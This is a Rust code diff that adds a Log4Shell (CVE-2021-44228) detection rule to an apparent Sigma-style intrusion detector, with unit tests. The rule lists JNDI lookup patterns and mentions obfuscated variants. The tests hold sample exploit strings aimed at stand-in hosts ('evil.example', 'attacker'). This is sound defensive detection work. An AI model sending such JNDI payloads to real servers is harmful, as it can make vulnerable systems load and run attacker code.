@@ -731,6 +731,45 @@ fn builtin_sigma_rules() -> Vec<SigmaRule> {
                 "t1611".into(),
             ],
         },
+        // Spec 056 Phase 6: bundled CVE detection. Pairs with the
+        // `pb-cve-2021-44228-log4shell` playbook (agent). `Contains` is
+        // case-insensitive, so this catches `JNDI:` / `jndi:` regardless
+        // of case in the request path or User-Agent (both land in the
+        // `http.request` event `summary`). Caveat: a pure signature does
+        // NOT catch heavily obfuscated payloads (`${${lower:j}ndi:...}`,
+        // nested `${...}`) — it is a fast first line, not a Log4j parser.
+        SigmaRule {
+            id: "cve-2021-44228-log4shell".into(),
+            title: "Log4Shell JNDI lookup in HTTP request (CVE-2021-44228)".into(),
+            level: Severity::Critical,
+            selection: vec![
+                FieldMatcher {
+                    field: "kind".into(),
+                    op: MatchOp::Contains,
+                    values: vec!["http".into()],
+                },
+                FieldMatcher {
+                    field: "summary".into(),
+                    op: MatchOp::Contains,
+                    values: vec![
+                        "${jndi:".into(),
+                        "jndi:ldap".into(),
+                        "jndi:ldaps".into(),
+                        "jndi:rmi".into(),
+                        "jndi:dns".into(),
+                        "jndi:nis".into(),
+                        "jndi:iiop".into(),
+                        "jndi:corba".into(),
+                    ],
+                },
+            ],
+            tags: vec![
+                "initial_access".into(),
+                "exploitation".into(),
+                "cve-2021-44228".into(),
+                "t1190".into(),
+            ],
+        },
     ]
 }
 
@@ -819,6 +858,51 @@ mod tests {
         let ev = make_event("ssh.login_failed", "auth_log", "Failed password for root");
         let inc = det.process(&ev);
         assert!(inc.is_none());
+    }
+
+    #[test]
+    fn sigma_matches_log4shell_jndi_in_http_request() {
+        let mut det = SigmaRuleDetector::new("test", Path::new("/nonexistent"), 300);
+        // Mirrors the http_capture summary format ("method path ... ua").
+        // A real Log4Shell probe lands the payload in the URI or UA.
+        let ev = make_event(
+            "http.request",
+            "http_capture",
+            "GET /search?q=${jndi:ldap://evil.example/a} curl/8.0",
+        );
+        let inc = det.process(&ev).expect("jndi probe must match");
+        assert!(inc.title.contains("Log4Shell"), "got: {}", inc.title);
+        assert_eq!(inc.severity, Severity::Critical);
+        // incident_id = "sigma:<rule.id>:<ts>" — the playbook triggers on
+        // the `sigma:cve-2021-44228-log4shell:*` kind_glob against this.
+        assert!(
+            inc.incident_id
+                .starts_with("sigma:cve-2021-44228-log4shell:"),
+            "got: {}",
+            inc.incident_id
+        );
+    }
+
+    #[test]
+    fn sigma_log4shell_case_insensitive_in_user_agent() {
+        let mut det = SigmaRuleDetector::new("test", Path::new("/nonexistent"), 300);
+        let ev = make_event(
+            "http.request",
+            "http_capture",
+            "GET / ${JNDI:RMI://attacker/x}",
+        );
+        assert!(det.process(&ev).is_some(), "uppercase JNDI must match");
+    }
+
+    #[test]
+    fn sigma_log4shell_no_match_on_benign_http() {
+        let mut det = SigmaRuleDetector::new("test", Path::new("/nonexistent"), 300);
+        let ev = make_event(
+            "http.request",
+            "http_capture",
+            "GET /index.html Mozilla/5.0",
+        );
+        assert!(det.process(&ev).is_none(), "benign request must not match");
     }
 
     #[test]
